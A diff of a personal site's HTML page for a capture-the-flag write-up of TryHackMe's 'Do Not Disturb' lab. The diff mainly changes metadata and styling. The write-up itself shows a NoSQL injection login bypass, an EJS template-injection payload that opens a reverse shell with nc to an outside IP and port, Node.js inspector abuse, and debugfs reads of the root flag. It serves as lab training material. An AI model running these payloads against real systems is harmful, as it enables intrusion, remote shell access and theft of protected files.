@@ -4,24 +4,25 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Do Not Disturb · hackerholidays</title>
-<meta name="description" content="CTF writeup: Do Not Disturb (hackerholidays)" />
+<meta name="description" content="Welcome to Day 7 of the TryHackMe Hacker Holidays 2026 writeups." />
 <meta name="theme-color" content="#16161e" />
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; frame-ancestors 'self'" />
 <link rel="canonical" href="https://aaadarsh1337.github.io/writeups/hackerholidays/do_not_disturb/" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Do Not Disturb · hackerholidays" />
-<meta property="og:description" content="CTF writeup: Do Not Disturb (hackerholidays)" />
+<meta property="og:description" content="Welcome to Day 7 of the TryHackMe Hacker Holidays 2026 writeups." />
 <meta property="og:url" content="https://aaadarsh1337.github.io/writeups/hackerholidays/do_not_disturb/" />
-<meta property="og:image" content="https://aaadarsh1337.github.io/assets/avatar.jpg" />
-<meta name="twitter:card" content="summary" />
+<meta property="og:image" content="https://aaadarsh1337.github.io/writeups/hackerholidays/do_not_disturb/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:title" content="Do Not Disturb · hackerholidays" />
-<meta name="twitter:description" content="CTF writeup: Do Not Disturb (hackerholidays)" />
-<meta name="twitter:image" content="https://aaadarsh1337.github.io/assets/avatar.jpg" />
-<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Do Not Disturb · hackerholidays", "description": "CTF writeup: Do Not Disturb (hackerholidays)", "url": "https://aaadarsh1337.github.io/writeups/hackerholidays/do_not_disturb/", "author": {"@type": "Person", "name": "Adarsh Pillai", "url": "https://aaadarsh1337.github.io/"}}</script>
+<meta name="twitter:description" content="Welcome to Day 7 of the TryHackMe Hacker Holidays 2026 writeups." />
+<meta name="twitter:image" content="https://aaadarsh1337.github.io/writeups/hackerholidays/do_not_disturb/og.png" />
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Do Not Disturb · hackerholidays", "description": "Welcome to Day 7 of the TryHackMe Hacker Holidays 2026 writeups.", "url": "https://aaadarsh1337.github.io/writeups/hackerholidays/do_not_disturb/", "author": {"@type": "Person", "name": "Adarsh Pillai", "url": "https://aaadarsh1337.github.io/"}}</script>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%2316161e'/%3E%3Crect x='13' y='4' width='6' height='24' fill='%237DCFFF'/%3E%3Crect x='4' y='13' width='24' height='6' fill='%237DCFFF'/%3E%3Crect x='14' y='6' width='4' height='20' fill='%2316161e'/%3E%3Crect x='6' y='14' width='20' height='4' fill='%2316161e'/%3E%3C/svg%3E" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../../css/tokens.css" />
 <link rel="stylesheet" href="../../css/style.css" />
 <link rel="stylesheet" href="../../css/pygments.css" />
 </head>
@@ -71,6 +72,7 @@
         <span class="tb-label">READING</span>
         <span>notes.md</span>
       </div>
+      <button type="button" class="btn btn--ghost btn--small" id="copyLinkBtn">Copy link</button>
       <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/notes.md" target="_blank" rel="noopener noreferrer">Source &#8599;</a>
     </div>
     <div class="reader__body">
@@ -81,34 +83,34 @@
 <p>Welcome to Day 7 of the TryHackMe Hacker Holidays 2026 writeups.</p>
 <p>A login page is available, so we first inspect the login request using Burp Suite.</p>
 <p>The application is vulnerable to NoSQL injection. In Burp, change the request parameters to:</p>
-<div class="highlight"><pre><span></span><code>username=attendant&amp;password[$ne]=null
+<div class="highlight is-output lang-text" data-lang="text"><pre><span></span><code>username=attendant&amp;password[$ne]=null
 </code></pre></div>
 
 <p>This bypasses the password check and logs us into the application.</p>
 <p>The application contains an EJS field that processes server-side JavaScript. We can use it to execute commands and obtain a reverse shell.</p>
 <p>The attached payload is:</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;%=</span><span class="w"> </span><span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s1">&#39;rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2&gt;&amp;1 0&lt;/tmp/b | nc 192.168.188.174 4444 1&gt;/tmp/b&#39;</span><span class="p">)</span><span class="w"> </span><span class="cp">%&gt;</span>
+<div class="highlight is-code lang-ejs" data-lang="ejs"><pre><span></span><code>&lt;%= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2&gt;&amp;1 0&lt;/tmp/b | nc 192.168.188.174 4444 1&gt;/tmp/b&#39;) %&gt;
 </code></pre></div>
 
 <p>After running the payload and receiving the shell, the user flag can be retrieved:</p>
-<blockquote>
+<blockquote class="flag">
 <p><code>THM{...}</code></p>
 </blockquote>
 <p>Next, we perform privilege-escalation enumeration using LinPEAS:</p>
-<div class="highlight"><pre><span></span><code>./linpeas.sh
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>./linpeas.sh
 </code></pre></div>
 
 <p>LinPEAS reveals interesting disk access permissions and a Node.js process listening on port <code>9229</code>.</p>
 <p>We connect to the Node.js inspector:</p>
-<div class="highlight"><pre><span></span><code>node<span class="w"> </span>inspect<span class="w"> </span><span class="m">127</span>.0.0.1:9229
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>node<span class="w"> </span>inspect<span class="w"> </span><span class="m">127</span>.0.0.1:9229
 </code></pre></div>
 
 <p>Enter the REPL:</p>
-<div class="highlight"><pre><span></span><code>repl
+<div class="highlight is-output lang-text" data-lang="text"><pre><span></span><code>repl
 </code></pre></div>
 
 <p>Now use the Node.js process to execute the <code>lsblk</code> command:</p>
-<div class="highlight"><pre><span></span><code><span class="nx">process</span><span class="p">.</span><span class="nx">getBuiltinModule</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;lsblk&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
+<div class="highlight is-code lang-javascript" data-lang="javascript"><pre><span></span><code><span class="nx">process</span><span class="p">.</span><span class="nx">getBuiltinModule</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;lsblk&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
 </code></pre></div>
 
 <p>The output reveals the disk device:</p>
@@ -116,11 +118,11 @@
 <p><code>/dev/nvme0n1p1</code></p>
 </blockquote>
 <p>Since we have raw disk access, we can use <code>debugfs</code> to read the root flag directly from the filesystem:</p>
-<div class="highlight"><pre><span></span><code>process.getBuiltinModule<span class="o">(</span><span class="s1">&#39;child_process&#39;</span><span class="o">)</span>.execSync<span class="o">(</span><span class="s1">&#39;debugfs -R &quot;cat /root/root.txt&quot; /dev/nvme0n1p1&#39;</span><span class="o">)</span>.toString<span class="o">()</span>
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>process.getBuiltinModule<span class="o">(</span><span class="s1">&#39;child_process&#39;</span><span class="o">)</span>.execSync<span class="o">(</span><span class="s1">&#39;debugfs -R &quot;cat /root/root.txt&quot; /dev/nvme0n1p1&#39;</span><span class="o">)</span>.toString<span class="o">()</span>
 </code></pre></div>
 
 <p>This reveals the root flag:</p>
-<blockquote>
+<blockquote class="flag">
 <p><code>THM{...}</code></p>
 </blockquote>
 <p>Happy Hacking!</p>
